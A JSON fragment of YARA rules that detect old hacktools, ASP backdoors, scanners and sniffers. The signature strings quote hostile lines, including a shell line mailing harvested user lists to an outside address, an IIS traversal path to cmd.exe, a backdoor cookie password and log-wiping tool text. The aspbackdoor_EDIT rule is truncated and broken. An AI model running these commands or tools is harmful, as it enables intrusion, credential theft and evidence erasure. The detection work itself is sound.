  "aspbackdoor_regdll": "rule aspbackdoor_regdll {\n\tmeta:\n\t\tdescription = \"Disclosed hacktool set (old stuff) - file regdll.asp\"\n\t\tauthor = \"Florian Roth\"\n\t\tdate = \"23.11.14\"\n\t\tscore = 60\n\t\thash = \"5c5e16a00bcb1437bfe519b707e0f5c5f63a488d\"\n\tstrings:\n\t\t$s1 = \"exitcode = oShell.Run(\\\"c:\\\\WINNT\\\\system32\\\\regsvr32.exe /u/s \\\" & strFile, 0, \" ascii\n\t\t$s3 = \"oShell.Run \\\"c:\\\\WINNT\\\\system32\\\\regsvr32.exe /u/s \\\" & strFile, 0, False\" fullword ascii\n\t\t$s4 = \"EchoB(\\\"regsvr32.exe exitcode = \\\" & exitcode)\" fullword ascii\n\t\t$s5 = \"Public Property Get oFS()\" fullword ascii\n\tcondition:\n\t\tall of them\n}",
  "CleanIISLog": "rule CleanIISLog {\n\tmeta:\n\t\tdescription = \"Disclosed hacktool set (old stuff) - file CleanIISLog.exe\"\n\t\tauthor = \"Florian Roth\"\n\t\tdate = \"23.11.14\"\n\t\tscore = 60\n\t\thash = \"827cd898bfe8aa7e9aaefbe949d26298f9e24094\"\n\tstrings:\n\t\t$s1 = \"CleanIP - Specify IP Address Which You Want Clear.\" fullword ascii\n\t\t$s2 = \"LogFile - Specify Log File Which You Want Process.\" fullword ascii\n\t\t$s8 = \"CleanIISLog Ver\" fullword ascii\n\t\t$s9 = \"msftpsvc\" fullword ascii\n\t\t$s10 = \"Fatal Error: MFC initialization failed\" fullword ascii\n\t\t$s11 = \"Specified \\\"ALL\\\" Will Process All Log Files.\" fullword ascii\n\t\t$s12 = \"Specified \\\".\\\" Will Clean All IP Record.\" fullword ascii\n\t\t$s16 = \"Service %s Stopped.\" fullword ascii\n\t\t$s20 = \"Process Log File %s...\" fullword ascii\n\tcondition:\n\t\t5 of them\n}",
  "sqlcheck": "rule sqlcheck {\n\tmeta:\n\t\tdescription = \"Disclosed hacktool set (old stuff) - file sqlcheck.exe\"\n\t\tauthor = \"Florian Roth\"\n\t\tdate = \"23.11.14\"\n\t\tscore = 60\n\t\thash = \"5a5778ac200078b627db84fdc35bf5bcee232dc7\"\n\tstrings:\n\t\t$s0 = \"Power by eyas<cooleyas@21cn.com>\" fullword ascii\n\t\t$s3 = \"\\\\ipc$ \\\"\\\" /user:\\\"\\\"\" fullword ascii\n\t\t$s4 = \"SQLCheck can only scan a class B network. Try again.\" fullword ascii\n\t\t$s14 = \"Example: SQLCheck 192.168.0.1 192.168.0.254\" fullword ascii\n\t\t$s20 = \"Usage: SQLCheck <StartIP> <EndIP>\" fullword ascii\n\tcondition:\n\t\t3 of them\n}",
  "sig_238_RunAsEx": "rule sig_238_RunAsEx {\n\tmeta:\n\t\tdescription = \"Disclosed hacktool set (old stuff) - file RunAsEx.exe\"\n\t\tauthor = \"Florian Roth\"\n\t\tdate = \"23.11.14\"\n\t\tscore = 60\n\t\thash = \"a22fa4e38d4bf82041d67b4ac5a6c655b2e98d35\"\n\tstrings:\n\t\t$s0 = \"RunAsEx By Assassin 2000. All Rights Reserved. http://www.netXeyes.com\" fullword ascii\n\t\t$s8 = \"cmd.bat\" fullword ascii\n\t\t$s9 = \"Note: This Program Can'nt Run With Local Machine.\" fullword ascii\n\t\t$s11 = \"%s Execute Succussifully.\" fullword ascii\n\t\t$s12 = \"winsta0\" fullword ascii\n\t\t$s15 = \"Usage: RunAsEx <UserName> <Password> <Execute File> [\\\"Execute Option\\\"]\" fullword ascii\n\tcondition:\n\t\t4 of them\n}",
  "sig_238_nbtdump": "rule sig_238_nbtdump {\n\tmeta:\n\t\tdescription = \"Disclosed hacktool set (old stuff) - file nbtdump.exe\"\n\t\tauthor = \"Florian Roth\"\n\t\tdate = \"23.11.14\"\n\t\tscore = 60\n\t\thash = \"cfe82aad5fc4d79cf3f551b9b12eaf9889ebafd8\"\n\tstrings:\n\t\t$s0 = \"Creation of results file - \\\"%s\\\" failed.\" fullword ascii\n\t\t$s1 = \"c:\\\\>nbtdump remote-machine\" fullword ascii\n\t\t$s7 = \"Cerberus NBTDUMP\" fullword ascii\n\t\t$s11 = \"<CENTER><H1>Cerberus Internet Scanner</H1>\" fullword ascii\n\t\t$s18 = \"<P><H3>Account Information</H3><PRE>\" fullword wide\n\t\t$s19 = \"%s's password is %s</H3>\" fullword wide\n\t\t$s20 = \"%s's password is blank</H3>\" fullword wide\n\tcondition:\n\t\t5 of them\n}",
  "sig_238_Glass2k": "rule sig_238_Glass2k {\n\tmeta:\n\t\tdescription = \"Disclosed hacktool set (old stuff) - file Glass2k.exe\"\n\t\tauthor = \"Florian Roth\"\n\t\tdate = \"23.11.14\"\n\t\tscore = 60\n\t\thash = \"b05455a1ecc6bc7fc8ddef312a670f2013704f1a\"\n\tstrings:\n\t\t$s0 = \"Portions Copyright (c) 1997-1999 Lee Hasiuk\" fullword ascii\n\t\t$s1 = \"C:\\\\Program Files\\\\Microsoft Visual Studio\\\\VB98\" fullword ascii\n\t\t$s3 = \"WINNT\\\\System32\\\\stdole2.tlb\" fullword ascii\n\t\t$s4 = \"Glass2k.exe\" fullword wide\n\t\t$s7 = \"NeoLite Executable File Compressor\" fullword ascii\n\tcondition:\n\t\tall of them\n}",
  "SplitJoin_V1_3_3_rar_Folder_3": "rule SplitJoin_V1_3_3_rar_Folder_3 {\n\tmeta:\n\t\tdescription = \"Disclosed hacktool set (old stuff) - file splitjoin.exe\"\n\t\tauthor = \"Florian Roth\"\n\t\tdate = \"23.11.14\"\n\t\tscore = 60\n\t\thash = \"21409117b536664a913dcd159d6f4d8758f43435\"\n\tstrings:\n\t\t$s2 = \"ie686@sohu.com\" fullword ascii\n\t\t$s3 = \"splitjoin.exe\" fullword ascii\n\t\t$s7 = \"SplitJoin\" fullword ascii\n\tcondition:\n\t\tall of them\n}",
  "aspbackdoor_EDIT": "rule aspbackdoor_EDIT {\n\tmeta:\n\t\tdescription = \"Disclosed hacktool set (old stuff) - file EDIT.ASP\"\n\t\tauthor = \"Florian Roth\"\n\t\tdate = \"23.11.14\"\n\t\tscore = 60\n\t\thash = \"12196cf62931cde7b6cb979c07bb5cc6a7535cbb\"\n\tstrings:\n\t\t$s1 = \"<meta HTTP-EQUIV=\\\"Content-Type\\\" CONTENT=\\\"text/html;charset=gb_2312-80\\\">\" fullword ascii\n\t\t$s2 = \"Set thisfile = fs.GetFile(whichfile)\" fullword ascii\n\t\t$s3 = \"response.write \\\"<a href='index.asp'>\" fullword ascii\n\t\t$s5 = \"if Request.Cookies(\\\"password\\\")=\\\"juchen\\\" then \" fullword ascii\n\t\t$s6 = \"Set thisfile = fs.OpenTextFile(whichfile, 1, False)\" fullword ascii\n\t\t$s7 = \"color: rgb(255,0,0); text-decoration: underline }",
  "aspbackdoor_entice": "rule aspbackdoor_entice {\n\tmeta:\n\t\tdescription = \"Disclosed hacktool set (old stuff) - file entice.asp\"\n\t\tauthor = \"Florian Roth\"\n\t\tdate = \"23.11.14\"\n\t\tscore = 60\n\t\thash = \"e273a1b9ef4a00ae4a5d435c3c9c99ee887cb183\"\n\tstrings:\n\t\t$s0 = \"<Form Name=\\\"FormPst\\\" Method=\\\"Post\\\" Action=\\\"entice.asp\\\">\" fullword ascii\n\t\t$s2 = \"if left(trim(request(\\\"sqllanguage\\\")),6)=\\\"select\\\" then\" fullword ascii\n\t\t$s4 = \"conndb.Execute(sqllanguage)\" fullword ascii\n\t\t$s5 = \"<!--#include file=sqlconn.asp-->\" fullword ascii\n\t\t$s6 = \"rstsql=\\\"select * from \\\"&rstable(\\\"table_name\\\")\" fullword ascii\n\tcondition:\n\t\tall of them\n}",
  "FPipe2_0": "rule FPipe2_0 {\n\tmeta:\n\t\tdescription = \"Disclosed hacktool set (old stuff) - file FPipe2.0.exe\"\n\t\tauthor = \"Florian Roth\"\n\t\tdate = \"23.11.14\"\n\t\tscore = 60\n\t\thash = \"891609db7a6787575641154e7aab7757e74d837b\"\n\tstrings:\n\t\t$s0 = \"made to port 80 of the remote machine at 192.168.1.101 with the\" fullword ascii\n\t\t$s1 = \"Unable to resolve hostname \\\"%s\\\"\" fullword ascii\n\t\t$s2 = \" -s    - outbound connection source port number\" fullword ascii\n\t\t$s3 = \"source port for that outbound connection being set to 53 also.\" fullword ascii\n\t\t$s4 = \"http://www.foundstone.com\" fullword ascii\n\t\t$s19 = \"FPipe\" fullword ascii\n\tcondition:\n\t\tall of them\n}",
  "InstGina": "rule InstGina {\n\tmeta:\n\t\tdescription = \"Disclosed hacktool set (old stuff) - file InstGina.exe\"\n\t\tauthor = \"Florian Roth\"\n\t\tdate = \"23.11.14\"\n\t\tscore = 60\n\t\thash = \"5317fbc39508708534246ef4241e78da41a4f31c\"\n\tstrings:\n\t\t$s0 = \"To Open Registry\" fullword ascii\n\t\t$s4 = \"I love Candy very much!!\" ascii\n\t\t$s5 = \"GinaDLL\" fullword ascii\n\tcondition:\n\t\tall of them\n}",
  "ArtTray_zip_Folder_ArtTray": "rule ArtTray_zip_Folder_ArtTray {\n\tmeta:\n\t\tdescription = \"Disclosed hacktool set (old stuff) - file ArtTray.exe\"\n\t\tauthor = \"Florian Roth\"\n\t\tdate = \"23.11.14\"\n\t\tscore = 60\n\t\thash = \"ee1edc8c4458c71573b5f555d32043cbc600a120\"\n\tstrings:\n\t\t$s0 = \"http://www.brigsoft.com\" fullword wide\n\t\t$s2 = \"ArtTrayHookDll.dll\" fullword ascii\n\t\t$s3 = \"ArtTray Version 1.0 \" fullword wide\n\t\t$s16 = \"TRM_HOOKCALLBACK\" fullword ascii\n\tcondition:\n\t\tall of them\n}",
  "sig_238_findoor": "rule sig_238_findoor {\n\tmeta:\n\t\tdescription = \"Disclosed hacktool set (old stuff) - file findoor.exe\"\n\t\tauthor = \"Florian Roth\"\n\t\tdate = \"23.11.14\"\n\t\tscore = 60\n\t\thash = \"cdb1ececceade0ecdd4479ecf55b0cc1cf11cdce\"\n\tstrings:\n\t\t$s0 = \"(non-Win32 .EXE or error in .EXE image).\" fullword ascii\n\t\t$s8 = \"PASS hacker@hacker.com\" fullword ascii\n\t\t$s9 = \"/scripts/..%c1%1c../winnt/system32/cmd.exe\" fullword ascii\n\t\t$s10 = \"MAIL FROM:hacker@hacker.com\" fullword ascii\n\t\t$s11 = \"http://isno.yeah.net\" fullword ascii\n\tcondition:\n\t\t4 of them\n}",
  "aspbackdoor_ipclear": "rule aspbackdoor_ipclear {\n\tmeta:\n\t\tdescription = \"Disclosed hacktool set (old stuff) - file ipclear.vbs\"\n\t\tauthor = \"Florian Roth\"\n\t\tdate = \"23.11.14\"\n\t\tscore = 60\n\t\thash = \"9f8fdfde4b729516330eaeb9141fb2a7ff7d0098\"\n\tstrings:\n\t\t$s0 = \"Set ServiceObj = GetObject(\\\"WinNT://\\\" & objNet.ComputerName & \\\"/w3svc\\\")\" fullword ascii\n\t\t$s1 = \"wscript.Echo \\\"USAGE:KillLog.vbs LogFileName YourIP.\\\"\" fullword ascii\n\t\t$s2 = \"Set txtStreamOut = fso.OpenTextFile(destfile, ForWriting, True)\" fullword ascii\n\t\t$s3 = \"Set objNet = WScript.CreateObject( \\\"WScript.Network\\\" )\" fullword ascii\n\t\t$s4 = \"Set fso = CreateObject(\\\"Scripting.FileSystemObject\\\")\" fullword ascii\n\tcondition:\n\t\tall of them\n}",
  "WinEggDropShellFinal_zip_Folder_InjectT": "rule WinEggDropShellFinal_zip_Folder_InjectT {\n\tmeta:\n\t\tdescription = \"Disclosed hacktool set (old stuff) - file InjectT.exe\"\n\t\tauthor = \"Florian Roth\"\n\t\tdate = \"23.11.14\"\n\t\tscore = 60\n\t\thash = \"516e80e4a25660954de8c12313e2d7642bdb79dd\"\n\tstrings:\n\t\t$s0 = \"Packed by exe32pack\" ascii\n\t\t$s1 = \"2TInject.Dll\" fullword ascii\n\t\t$s2 = \"Windows Services\" fullword ascii\n\t\t$s3 = \"Findrst6\" fullword ascii\n\t\t$s4 = \"Press Any Key To Continue......\" fullword ascii\n\tcondition:\n\t\tall of them\n}",
  "sig_238_rshsvc": "rule sig_238_rshsvc {\n\tmeta:\n\t\tdescription = \"Disclosed hacktool set (old stuff) - file rshsvc.bat\"\n\t\tauthor = \"Florian Roth\"\n\t\tdate = \"23.11.14\"\n\t\tscore = 60\n\t\thash = \"fb15c31254a21412aecff6a6c4c19304eb5e7d75\"\n\tstrings:\n\t\t$s0 = \"if not exist %1\\\\rshsetup.exe goto ERROR2\" fullword ascii\n\t\t$s1 = \"ECHO rshsetup.exe is not found in the %1 directory\" fullword ascii\n\t\t$s9 = \"REM %1 directory must have rshsetup.exe,rshsvc.exe and rshsvc.dll\" fullword ascii\n\t\t$s10 = \"copy %1\\\\rshsvc.exe\" fullword ascii\n\t\t$s12 = \"ECHO Use \\\"net start rshsvc\\\" to start the service.\" fullword ascii\n\t\t$s13 = \"rshsetup %SystemRoot%\\\\system32\\\\rshsvc.exe %SystemRoot%\\\\system32\\\\rshsvc.dll\" fullword ascii\n\t\t$s18 = \"pushd %SystemRoot%\\\\system32\" fullword ascii\n\tcondition:\n\t\tall of them\n}",
  "gina_zip_Folder_gina": "rule gina_zip_Folder_gina {\n\tmeta:\n\t\tdescription = \"Disclosed hacktool set (old stuff) - file gina.dll\"\n\t\tauthor = \"Florian Roth\"\n\t\tdate = \"23.11.14\"\n\t\tscore = 60\n\t\thash = \"e0429e1b59989cbab6646ba905ac312710f5ed30\"\n\tstrings:\n\t\t$s0 = \"NEWGINA.dll\" fullword ascii\n\t\t$s1 = \"LOADER ERROR\" fullword ascii\n\t\t$s3 = \"WlxActivateUserShell\" fullword ascii\n\t\t$s6 = \"WlxWkstaLockedSAS\" fullword ascii\n\t\t$s13 = \"WlxIsLockOk\" fullword ascii\n\t\t$s14 = \"The procedure entry point %s could not be located in the dynamic link library %s\" fullword ascii\n\t\t$s16 = \"WlxShutdown\" fullword ascii\n\t\t$s17 = \"The ordinal %u could not be located in the dynamic link library %s\" fullword ascii\n\tcondition:\n\t\tall of them\n}",
  "superscan3_0": "rule superscan3_0 {\n\tmeta:\n\t\tdescription = \"Disclosed hacktool set (old stuff) - file superscan3.0.exe\"\n\t\tauthor = \"Florian Roth\"\n\t\tdate = \"23.11.14\"\n\t\tscore = 60\n\t\thash = \"a9a02a14ea4e78af30b8b4a7e1c6ed500a36bc4d\"\n\tstrings:\n\t\t$s0 = \"\\\\scanner.ini\" fullword ascii\n\t\t$s1 = \"\\\\scanner.exe\" fullword ascii\n\t\t$s2 = \"\\\\scanner.lst\" fullword ascii\n\t\t$s4 = \"\\\\hensss.lst\" fullword ascii\n\t\t$s5 = \"STUB32.EXE\" fullword wide\n\t\t$s6 = \"STUB.EXE\" fullword wide\n\t\t$s8 = \"\\\\ws2check.exe\" fullword ascii\n\t\t$s9 = \"\\\\trojans.lst\" fullword ascii\n\t\t$s10 = \"1996 InstallShield Software Corporation\" fullword wide\n\tcondition:\n\t\tall of them\n}",
  "sig_238_xsniff": "rule sig_238_xsniff {\n\tmeta:\n\t\tdescription = \"Disclosed hacktool set (old stuff) - file xsniff.exe\"\n\t\tauthor = \"Florian Roth\"\n\t\tdate = \"23.11.14\"\n\t\tscore = 60\n\t\thash = \"d61d7329ac74f66245a92c4505a327c85875c577\"\n\tstrings:\n\t\t$s2 = \"xsiff.exe -pass -hide -log pass.log\" fullword ascii\n\t\t$s3 = \"%s - simple sniffer for win2000\" fullword ascii\n\t\t$s4 = \"xsiff.exe -tcp -udp -asc -addr 192.168.1.1\" fullword ascii\n\t\t$s5 = \"HOST: %s USER: %s, PASS: %s\" fullword ascii\n\t\t$s7 = \"http://www.xfocus.org\" fullword ascii\n\t\t$s9 = \"  -pass        : Filter username/password\" fullword ascii\n\t\t$s18 = \"  -udp         : Output udp packets\" fullword ascii\n\t\t$s19 = \"Code by glacier <glacier@xfocus.org>\" fullword ascii\n\t\t$s20 = \"  -tcp         : Output tcp packets\" fullword ascii\n\tcondition:\n\t\t6 of them\n}",
  "sig_238_fscan": "rule sig_238_fscan {\n\tmeta:\n\t\tdescription = \"Disclosed hacktool set (old stuff) - file fscan.exe\"\n\t\tauthor = \"Florian Roth\"\n\t\tdate = \"23.11.14\"\n\t\tscore = 60\n\t\thash = \"d5646e86b5257f9c83ea23eca3d86de336224e55\"\n\tstrings:\n\t\t$s0 = \"FScan v1.12 - Command line port scanner.\" fullword ascii\n\t\t$s2 = \" -n    - no port scanning - only pinging (unless you use -q)\" fullword ascii\n\t\t$s5 = \"Example: fscan -bp 80,100-200,443 10.0.0.1-10.0.1.200\" fullword ascii\n\t\t$s6 = \" -z    - maximum simultaneous threads to use for scanning\" fullword ascii\n\t\t$s12 = \"Failed to open the IP list file \\\"%s\\\"\" fullword ascii\n\t\t$s13 = \"http://www.foundstone.com\" fullword ascii\n\t\t$s16 = \" -p    - TCP port(s) to scan (a comma separated list of ports/ranges) \" fullword ascii\n\t\t$s18 = \"Bind port number out of range. Using system default.\" fullword ascii\n\t\t$s19 = \"fscan.exe\" fullword wide\n\tcondition:\n\t\t4 of them\n}",
  "_iissample_nesscan_twwwscan": "rule _iissample_nesscan_twwwscan {\n\tmeta:\n\t\tdescription = \"Disclosed hacktool set (old stuff) - from files iissample.exe, nesscan.exe, twwwscan.exe\"\n\t\tauthor = \"Florian Roth\"\n\t\tdate = \"23.11.14\"\n\t\tscore = 60\n\t\tsuper_rule = 1\n\t\thash0 = \"7f20962bbc6890bf48ee81de85d7d76a8464b862\"\n\t\thash1 = \"c0b1a2196e82eea4ca8b8c25c57ec88e4478c25b\"\n\t\thash2 = \"548f0d71ef6ffcc00c0b44367ec4b3bb0671d92f\"\n\tstrings:\n\t\t$s0 = \"Connecting HTTP Port - Result: \" fullword\n\t\t$s1 = \"No space for command line argument vector\" fullword\n\t\t$s3 = \"Microsoft(July/1999~) http://www.microsoft.com/technet/security/current.asp\" fullword\n\t\t$s5 = \"No space for copy of command line\" fullword\n\t\t$s7 = \"-  Windows NT,2000 Patch Method  - \" fullword\n\t\t$s8 = \"scanf : floating point formats not linked\" fullword\n\t\t$s12 = \"hrdir_b.c: LoadLibrary != mmdll borlndmm failed\" fullword\n\t\t$s13 = \"!\\\"what?\\\"\" fullword\n\t\t$s14 = \"%s Port %d Closed\" fullword\n\t\t$s16 = \"printf : floating point formats not linked\" fullword\n\t\t$s17 = \"xxtype.cpp\" fullword\n\tcondition:\n\t\tall of them\n}",
  "_FsHttp_FsPop_FsSniffer": "rule _FsHttp_FsPop_FsSniffer {\n\tmeta:\n\t\tdescription = \"Disclosed hacktool set (old stuff) - from files FsHttp.exe, FsPop.exe, FsSniffer.exe\"\n\t\tauthor = \"Florian Roth\"\n\t\tdate = \"23.11.14\"\n\t\tscore = 60\n\t\tsuper_rule = 1\n\t\thash0 = \"9d4e7611a328eb430a8bb6dc7832440713926f5f\"\n\t\thash1 = \"ae23522a3529d3313dd883727c341331a1fb1ab9\"\n\t\thash2 = \"7ffc496cd4a1017485dfb571329523a52c9032d8\"\n\tstrings:\n\t\t$s0 = \"-ERR Invalid Command, Type [Help] For Command List\" fullword\n\t\t$s1 = \"-ERR Get SMS Users ID Failed\" fullword\n\t\t$s2 = \"Control Time Out 90 Secs, Connection Closed\" fullword\n\t\t$s3 = \"-ERR Post SMS Failed\" fullword\n\t\t$s4 = \"Current.hlt\" fullword\n\t\t$s6 = \"Histroy.hlt\" fullword\n\t\t$s7 = \"-ERR Send SMS Failed\" fullword\n\t\t$s12 = \"-ERR Change Password <New Password>\" fullword\n\t\t$s17 = \"+OK Send SMS Succussifully\" fullword\n\t\t$s18 = \"+OK Set New Password: [%s]\" fullword\n\t\t$s19 = \"CHANGE PASSWORD\" fullword\n\tcondition:\n\t\tall of them\n}",
  "Ammyy_Admin_AA_v3": "rule Ammyy_Admin_AA_v3 {\n\tmeta:\n\t\tdescription = \"Remote Admin Tool used by APT group Anunak (ru) - file AA_v3.4.exe and AA_v3.5.exe\"\n\t\tauthor = \"Florian Roth\"\n\t\treference = \"http://goo.gl/gkAg2E\"\n\t\tdate = \"2014/12/22\"\n\t\tscore = 55\n\t\thash1 = \"b130611c92788337c4f6bb9e9454ff06eb409166\"\n\t\thash2 = \"07539abb2623fe24b9a05e240f675fa2d15268cb\"\n\tstrings:\n\t\t$x1 = \"S:\\\\Ammyy\\\\sources\\\\target\\\\TrService.cpp\" fullword ascii\n\t\t$x2 = \"S:\\\\Ammyy\\\\sources\\\\target\\\\TrDesktopCopyRect.cpp\" fullword ascii\n\t\t$x3 = \"Global\\\\Ammyy.Target.IncomePort\" fullword ascii\n\t\t$x4 = \"S:\\\\Ammyy\\\\sources\\\\target\\\\TrFmFileSys.cpp\" fullword ascii\n\t\t$x5 = \"Please enter password for accessing remote computer\" fullword ascii\n\n\t\t$s1 = \"CreateProcess1()#3 %d error=%d\" fullword ascii\n\t\t$s2 = \"CHttpClient::SendRequest2(%s, %s, %d) error: invalid host name.\" fullword ascii\n\t\t$s3 = \"ERROR: CreateProcessAsUser() error=%d, session=%d\" fullword ascii\n\t\t$s4 = \"ERROR: FindProcessByName('explorer.exe')\" fullword ascii\n\tcondition:\n\t\t2 of ($x*) or all of ($s*)\n}",
  "LinuxHacktool_eyes_screen": "rule LinuxHacktool_eyes_screen {\n\tmeta:\n\t\tdescription = \"Linux hack tools - file screen\"\n\t\tauthor = \"Florian Roth\"\n\t\treference = \"not set\"\n\t\tdate = \"2015/01/19\"\n\t\thash = \"a240a0118739e72ff89cefa2540bf0d7da8f8a6c\"\n\tstrings:\n\t\t$s0 = \"or: %s -r [host.tty]\" fullword ascii\n\t\t$s1 = \"%s: process: character, ^x, or (octal) \\\\032 expected.\" fullword ascii\n\t\t$s2 = \"Type \\\"screen [-d] -r [pid.]tty.host\\\" to resume one of them.\" fullword ascii\n\t\t$s6 = \"%s: at [identifier][%%|*|#] command [args]\" fullword ascii\n\t\t$s8 = \"Slurped only %d characters (of %d) into buffer - try again\" fullword ascii\n\t\t$s11 = \"command from %s: %s %s\" fullword ascii\n\t\t$s16 = \"[ Passwords don't match - your armor crumbles away ]\" fullword ascii\n\t\t$s19 = \"[ Passwords don't match - checking turned off ]\" fullword ascii\n\tcondition:\n\t\tall of them\n}",
  "LinuxHacktool_eyes_scanssh": "rule LinuxHacktool_eyes_scanssh {\n\tmeta:\n\t\tdescription = \"Linux hack tools - file scanssh\"\n\t\tauthor = \"Florian Roth\"\n\t\treference = \"not set\"\n\t\tdate = \"2015/01/19\"\n\t\thash = \"467398a6994e2c1a66a3d39859cde41f090623ad\"\n\tstrings:\n\t\t$s0 = \"Connection closed by remote host\" fullword ascii\n\t\t$s1 = \"Writing packet : error on socket (or connection closed): %s\" fullword ascii\n\t\t$s2 = \"Remote connection closed by signal SIG%s %s\" fullword ascii\n\t\t$s4 = \"Reading private key %s failed (bad passphrase ?)\" fullword ascii\n\t\t$s5 = \"Server closed connection\" fullword ascii\n\t\t$s6 = \"%s: line %d: list delimiter not followed by keyword\" fullword ascii\n\t\t$s8 = \"checking for version `%s' in file %s required by file %s\" fullword ascii\n\t\t$s9 = \"Remote host closed connection\" fullword ascii\n\t\t$s10 = \"%s: line %d: bad command `%s'\" fullword ascii\n\t\t$s13 = \"verifying that server is a known host : file %s not found\" fullword ascii\n\t\t$s14 = \"%s: line %d: expected service, found `%s'\" fullword ascii\n\t\t$s15 = \"%s: line %d: list delimiter not followed by domain\" fullword ascii\n\t\t$s17 = \"Public key from server (%s) doesn't match user preference (%s)\" fullword ascii\n\tcondition:\n\t\tall of them\n}",
  "LinuxHacktool_eyes_pscan2": "rule LinuxHacktool_eyes_pscan2 {\n\tmeta:\n\t\tdescription = \"Linux hack tools - file pscan2\"\n\t\tauthor = \"Florian Roth\"\n\t\treference = \"not set\"\n\t\tdate = \"2015/01/19\"\n\t\thash = \"56b476cba702a4423a2d805a412cae8ef4330905\"\n\tstrings:\n\t\t$s0 = \"# pscan completed in %u seconds. (found %d ips)\" fullword ascii\n\t\t$s1 = \"Usage: %s <b-block> <port> [c-block]\" fullword ascii\n\t\t$s3 = \"%s.%d.* (total: %d) (%.1f%% done)\" fullword ascii\n\t\t$s8 = \"Invalid IP.\" fullword ascii\n\t\t$s9 = \"# scanning: \" fullword ascii\n\t\t$s10 = \"Unable to allocate socket.\" fullword ascii\n\tcondition:\n\t\t2 of them\n}",
  "LinuxHacktool_eyes_a": "rule LinuxHacktool_eyes_a {\n\tmeta:\n\t\tdescription = \"Linux hack tools - file a\"\n\t\tauthor = \"Florian Roth\"\n\t\treference = \"not set\"\n\t\tdate = \"2015/01/19\"\n\t\thash = \"458ada1e37b90569b0b36afebba5ade337ea8695\"\n\tstrings:\n\t\t$s0 = \"cat trueusers.txt | mail -s \\\"eyes\\\" clubby@slucia.com\" fullword ascii\n\t\t$s1 = \"mv scan.log bios.txt\" fullword ascii\n\t\t$s2 = \"rm -rf bios.txt\" fullword ascii\n\t\t$s3 = \"echo -e \\\"# by Eyes.\\\"\" fullword ascii\n\t\t$s4 = \"././pscan2 $1 22\" fullword ascii\n\t\t$s10 = \"echo \\\"#cautam...\\\"\" fullword ascii\n\tcondition:\n\t\t2 of them\n}",
  "LinuxHacktool_eyes_mass": "rule LinuxHacktool_eyes_mass {\n\tmeta:\n\t\tdescription = \"Linux hack tools - file mass\"\n\t\tauthor = \"Florian Roth\"\n\t\treference = \"not set\"\n\t\tdate = \"2015/01/19\"\n\t\thash = \"2054cb427daaca9e267b252307dad03830475f15\"\n\tstrings:\n\t\t$s0 = \"cat trueusers.txt | mail -s \\\"eyes\\\" clubby@slucia.com\" fullword ascii\n\t\t$s1 = \"echo -e \\\"${BLU}Private Scanner By Raphaello , DeMMoNN , tzepelush & DraC\\\\n\\\\r\" ascii\n\t\t$s3 = \"killall -9 pscan2\" fullword ascii\n\t\t$s5 = \"echo \\\"[*] ${DCYN}Gata esti h4x0r ;-)${RES}  [*]\\\"\" fullword ascii\n\t\t$s6 = \"echo -e \\\"${DCYN}@#@#@#@#@#@#@#@#@#@#@#@#@#@#@#@#@#@#@#@#@#@#@#@#@#@#@#${RES}\\\"\" fullword ascii\n\tcondition:\n\t\t1 of them\n}",
  "LinuxHacktool_eyes_pscan2_2": "rule LinuxHacktool_eyes_pscan2_2 {\n\tmeta:\n\t\tdescription = \"Linux hack tools - file pscan2.c\"\n\t\tauthor = \"Florian Roth\"\n\t\treference = \"not set\"\n\t\tdate = \"2015/01/19\"\n\t\thash = \"eb024dfb441471af7520215807c34d105efa5fd8\"\n\tstrings:\n\t\t$s0 = \"snprintf(outfile, sizeof(outfile) - 1, \\\"scan.log\\\", argv[1], argv[2]);\" fullword ascii\n\t\t$s2 = \"printf(\\\"Usage: %s <b-block> <port> [c-block]\\\\n\\\", argv[0]);\" fullword ascii\n\t\t$s3 = \"printf(\\\"\\\\n# pscan completed in %u seconds. (found %d ips)\\\\n\\\", (time(0) - sca\" ascii\n\t\t$s19 = \"connlist[i].addr.sin_family = AF_INET;\" fullword ascii\n\t\t$s20 = \"snprintf(last, sizeof(last) - 1, \\\"%s.%d.* (total: %d) (%.1f%% done)\\\",\" fullword ascii\n\tcondition:\n\t\t2 of them\n}",
  "CN_Portscan": "rule CN_Portscan : APT\n{\n    meta:\n        description = \"CN Port Scanner\"\n        author = \"Florian Roth\"\n        release_date = \"2013-11-29\"\n        confidential = false\n\t\tscore = 70\n    strings:\n    \t$s1 = \"MZ\"\n\t\t$s2 = \"TCP 12.12.12.12\"\n    condition:\n        ($s1 at 0) and $s2\n}",
  "WMI_vbs": "rule WMI_vbs : APT\n{\n    meta:\n        description = \"WMI Tool - APT\"\n        author = \"Florian Roth\"\n        release_date = \"2013-11-29\"\n        confidential = false\n\t\tscore = 70\n    strings:\n\t\t$s3 = \"WScript.Echo \\\"   $$\\\\      $$\\\\ $$\\\\      $$\\\\ $$$$$$\\\\ $$$$$$$$\\\\ $$\\\\   $$\\\\ $$$$$$$$\\\\  $$$$$$\"\n    condition:\n        all of them\n}",
  "CN_Toolset__XScanLib_XScanLib_XScanLib": "rule CN_Toolset__XScanLib_XScanLib_XScanLib {\n\tmeta:\n\t\tdescription = \"Detects a Chinese hacktool from a disclosed toolset - from files XScanLib.dll, XScanLib.dll, XScanLib.dll\"\n\t\tauthor = \"Florian Roth\"\n\t\treference = \"http://qiannao.com/ls/905300366/33834c0c/\"\n\t\treference2 = \"https://raw.githubusercontent.com/Neo23x0/Loki/master/signatures/thor-hacktools.yar\"\n\t\tdate = \"2015/03/30\"\n\t\tscore = 70\n\t\tsuper_rule = 1\n\t\thash0 = \"af419603ac28257134e39683419966ab3d600ed2\"\n\t\thash1 = \"c5cb4f75cf241f5a9aea324783193433a42a13b0\"\n\t\thash2 = \"135f6a28e958c8f6a275d8677cfa7cb502c8a822\"\n\tstrings:\n\t\t$s1 = \"Plug-in thread causes an exception, failed to alert user.\" fullword\n\t\t$s2 = \"PlugGetUdpPort\" fullword\n\t\t$s3 = \"XScanLib.dll\" fullword\n\t\t$s4 = \"PlugGetTcpPort\" fullword\n\t\t$s11 = \"PlugGetVulnNum\" fullword\n\tcondition:\n\t\tall of them\n}",
